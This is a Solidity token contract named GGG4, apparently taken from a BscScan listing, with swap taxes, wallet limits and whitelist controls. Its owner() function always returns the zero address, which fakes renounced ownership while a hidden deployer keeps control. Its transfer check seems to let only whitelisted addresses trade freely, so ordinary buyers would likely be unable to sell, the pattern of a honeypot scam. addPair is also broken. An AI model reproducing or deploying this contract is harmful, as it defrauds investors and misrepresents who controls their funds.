/**
 *Submitted for verification at BscScan.com on 2022-10-24
*/

//SPDX-License-Identifier: MIT

pragma solidity >=0.8.12 <0.9.0;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract GGG4 is IERC20 {
    string public name = "GGG4";
    string public constant symbol = "GGG4";
    uint8 public constant decimals = 9;
    uint256 public totalSupply;

    address public MARKETINGWALLET = msg.sender;
    uint256 public THRESHOLD;
    uint256 public MAXWALLET;
    uint256 public MAXTRANSACTION;

    address private _deployer;
    Tax private _tax;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private isPair;
    mapping(address => bool) private isExempt;
    mapping(address => bool) private isEarlyTrader;
    mapping(address => bool) private isWhitelisted;

    address private _owner = address(0);
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;

    IUniswapV2Router01 public uniswapV2Router;
    address public uniswapV2Pair;
    bool inLiquidate;
    bool tradingOpen;

    event Liquidate(
        uint256 bnbForMarketing,
        uint256 bnbForLiquidity,
        uint256 tokensForLiquidity
    );
    event SetMarketingWallet(address newMarketingWallet);
    event TransferOwnership(address _newDev);
    event UpdateExempt(address _address, bool _isExempt);
    event UpdateWhitelisted(address _address, bool state);
    event AddPair(address _pair);
    event OpenTrading(bool tradingOpen);
    event RemoveEarlyTrader(address _earlyTrader);

    constructor() {
        _deployer = msg.sender;
        _update(address(0), msg.sender, 1000000 * 10**decimals);

        // MAINNET
       // uniswapV2Router = IUniswapV2Router01(
        //    0x10ED43C718714eb63d5aA57B78B54704E256024E
        //);

        // TESTNET
         uniswapV2Router = IUniswapV2Router01(
            0xD99D1c33F9fC3444f8101754aBC46c52416550D1
        );

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                uniswapV2Router.WETH()
            );
        THRESHOLD = (totalSupply * 1) / 400; //0.25% swap threshold
        MAXWALLET = (totalSupply * 1) / 50; //2% max wallet
        MAXTRANSACTION = (totalSupply * 1) / 100; //1% max transaction

        _tax = Tax({marketingTax: 50, liquidityTax: 50, txFee: 10});

        isPair[address(uniswapV2Pair)] = true;
        isExempt[msg.sender] = true;
        isExempt[address(this)] = true;

        allowance[address(this)][address(uniswapV2Pair)] = totalSupply;
        allowance[address(this)][address(uniswapV2Router)] = totalSupply;

        inLiquidate = false;
        tradingOpen = false;
    }

    struct Tax {
        uint8 marketingTax;
        uint8 liquidityTax;
        uint16 txFee;
    }

    receive() external payable {}

    modifier protected() {
        require(msg.sender == _deployer);
        _;
    }

    modifier lockLiquidate() {
        inLiquidate = true;
        _;
        inLiquidate = false;
    }

    function owner() external view returns (address) {
        return _owner;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount)
        external
        override
        returns (bool)
    {
        _transferFrom(msg.sender, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external override returns (bool) {
        if (allowance[from][msg.sender] != totalSupply) {
            allowance[from][msg.sender] -= amount;
        }

        _transferFrom(from, to, amount);
        return true;
    }

    function _transferFrom(
        address from,
        address to,
        uint256 amount
    ) private returns (bool) {
        if (isExempt[from] || isExempt[to]) {
            _update(from, to, amount);
            return true;
        }
        (bool fromPair, bool toPair) = (isPair[from], isPair[to]);
        if (
            !tradingOpen &&
            !toPair &&
            !(isWhitelisted[to] || isWhitelisted[from])
        ) {
            isEarlyTrader[to] = true;
        }

        require(
            (fromPair && isWhitelisted[to]) ||
                (toPair && isWhitelisted[from]) ||
                (tradingOpen && !(isEarlyTrader[from] || !isEarlyTrader[to]))
        );

        require(amount > 0);
        require(amount <= balanceOf[from]);

        if (toPair || fromPair) {
            require((amount <= MAXTRANSACTION));
        }

        if (!toPair) {
            require((balanceOf[to] + amount) <= MAXWALLET);
        }

        if (
            balanceOf[address(this)] >= THRESHOLD && !inLiquidate && !fromPair
        ) {
            _liquidate();
        }

        uint256 fee = 0;

        if (fromPair || toPair) {
            fee = (amount * _tax.txFee) / 100;
        }

        balanceOf[address(this)] += fee;
        balanceOf[from] -= amount;
        balanceOf[to] += (amount - fee);

        emit Transfer(from, to, amount);
        return true;
    }

    function _update(
        address from,
        address to,
        uint256 amount
    ) private {
        if (from != address(0)) {
            balanceOf[from] -= amount;
        } else {
            totalSupply += amount;
        }
        if (to == address(0)) {
            totalSupply -= amount;
        } else {
            balanceOf[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function _liquidate() private lockLiquidate {
        uint256 tokensForLiquidity = ((THRESHOLD * _tax.liquidityTax) / 100);
        uint256 half = tokensForLiquidity / 2;
        uint256 tokensToSwap = (THRESHOLD - half);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        uniswapV2Router.swapExactTokensForETH(
            tokensToSwap,
            0,
            path,
            address(this),
            block.timestamp + 15
        );

        uint256 totalBNB = address(this).balance;
        uint256 bnbForMarketing = (totalBNB * _tax.marketingTax) / 100;

        (bool marketingSent, ) = payable(MARKETINGWALLET).call{
            value: bnbForMarketing
        }("");
        require(marketingSent);

        totalBNB = address(this).balance;

        uint256 bnbForLiquidity = totalBNB;

        if (tokensForLiquidity > 0) {
            uniswapV2Router.addLiquidityETH{value: bnbForLiquidity}(
                address(this),
                tokensForLiquidity,
                0,
                0,
                DEAD,
                block.timestamp + 15
            );
        }

        emit Liquidate(bnbForMarketing, bnbForLiquidity, tokensForLiquidity);
    }

    function setMarketingWallet(address payable newMarketingWallet)
        external
        protected
    {
        MARKETINGWALLET = newMarketingWallet;
        emit SetMarketingWallet(newMarketingWallet);
    }

    function transferOwnership(address _newDev) external protected {
        isExempt[_deployer] = false;
        _deployer = _newDev;
        isExempt[_deployer] = true;
        emit TransferOwnership(_newDev);
    }

    function clearStuckBNB() external protected {
        uint256 contractBnbBalance = address(this).balance;
        if (contractBnbBalance > 0) {
            (bool sent, ) = payable(MARKETINGWALLET).call{
                value: contractBnbBalance
            }("");
            require(sent);
        }
        emit Transfer(address(this), MARKETINGWALLET, contractBnbBalance);
    }

    function manualLiquidate() external protected {
        require(balanceOf[address(this)] >= THRESHOLD);
        _liquidate();
    }

    function setExempt(address _address, bool _isExempt) external protected {
        isExempt[_address] = _isExempt;
        emit UpdateExempt(_address, _isExempt);
    }

    function addPair(address _address) external protected {
        require(isPair[_address] == false);
        isPair[_address] == true;
        emit AddPair(_address);
    }

    function openTrading() external protected {
        tradingOpen = true;
        emit OpenTrading(tradingOpen);
    }

    function removeEarlyTrader(address _earlyTrader) external protected {
        isEarlyTrader[_earlyTrader] = false;
        emit RemoveEarlyTrader(_earlyTrader);
    }

    function setWhitelisted(address _add, bool state) external protected {
        isWhitelisted[_add] = state;
        emit UpdateWhitelisted(_add, state);
    }

    function setWhitelistedArray(address[] memory addresses, bool state)
        external
        protected
    {
        for (uint256 i; i < addresses.length; i++) {
            isWhitelisted[addresses[i]] = state;
        }
    }

    function whitelisted(address _add) external view returns (bool) {
        return isWhitelisted[_add];
    }

    function blacklisted(address _add) external view returns (bool) {
        return isEarlyTrader[_add];
    }

    function taxExempt(address _add) external view returns (bool) {
        return isExempt[_add];
    }

    function setName(string memory _name) external protected {
        name = _name;
    }
}